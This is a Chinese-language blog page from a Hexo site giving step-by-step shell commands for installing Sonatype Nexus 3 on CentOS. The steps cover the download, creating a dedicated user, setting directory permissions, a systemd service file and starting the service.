    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Vision.Yi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Vision 的空间">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/08/centos_install_nexus/" class="post-title-link" itemprop="url">centOS 安装 nexus</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-08 17:26:29" itemprop="dateCreated datePublished" datetime="2019-11-08T17:26:29+08:00">2019-11-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-11-25 14:26:54" itemprop="dateModified" datetime="2020-11-25T14:26:54+08:00">2020-11-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="1-下载nexus包"><a href="#1-下载nexus包" class="headerlink" title="1. 下载nexus包"></a><strong>1. 下载nexus包</strong></h2><pre><code>sudo wget -c https://download.sonatype.com/nexus/3/latest-unix.tar.gz
sudo tar -zxvf nexus-3.28.1-01-unix.tar.gz
mv nexus-3.28.1-01 /usr/local/nexus/</code></pre><h2 id="2-创建nexus用户用户组"><a href="#2-创建nexus用户用户组" class="headerlink" title="2.创建nexus用户用户组"></a>2.创建nexus用户用户组</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">groupadd nexus</span><br><span class="line">useradd -M -g nexus -s /sbin/nologin nexus</span><br><span class="line"><span class="built_in">id</span> nexus</span><br></pre></td></tr></table></figure>

<h2 id="3-创建目录并授权"><a href="#3-创建目录并授权" class="headerlink" title="3.创建目录并授权"></a>3.创建目录并授权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /data/sonatype-work/</span><br><span class="line"><span class="built_in">chown</span> nexus:nexus /data/sonatype-work/</span><br><span class="line"><span class="built_in">chmod</span> -R 755 /data/sonatype-work/</span><br><span class="line"></span><br><span class="line">vim /usr/local/nexus/bin/nexus.vmoptions</span><br></pre></td></tr></table></figure>



<h2 id="4-设置自动启动"><a href="#4-设置自动启动" class="headerlink" title="4. 设置自动启动"></a>4. 设置自动启动</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /usr/lib/systemd/system/nexus.service &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">[Unit]</span></span><br><span class="line"><span class="string">Description=nexus service</span></span><br><span class="line"><span class="string">After=network.target</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Service]</span></span><br><span class="line"><span class="string">Type=forking</span></span><br><span class="line"><span class="string">LimitNOFILE=65536</span></span><br><span class="line"><span class="string">ExecStart=/usr/local/nexus/bin/nexus start</span></span><br><span class="line"><span class="string">ExecStop=/usr/local/nexus/bin/nexus stop</span></span><br><span class="line"><span class="string">User=nexus</span></span><br><span class="line"><span class="string">Restart=on-abort</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Install]</span></span><br><span class="line"><span class="string">WantedBy=multi-user.target</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>



<h2 id="5-启动nexus"><a href="#5-启动nexus" class="headerlink" title="5.启动nexus"></a>5.启动nexus</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start nexus.service</span><br></pre></td></tr></table></figure>



      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Vision.Yi</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">54</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Vision.Yi</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
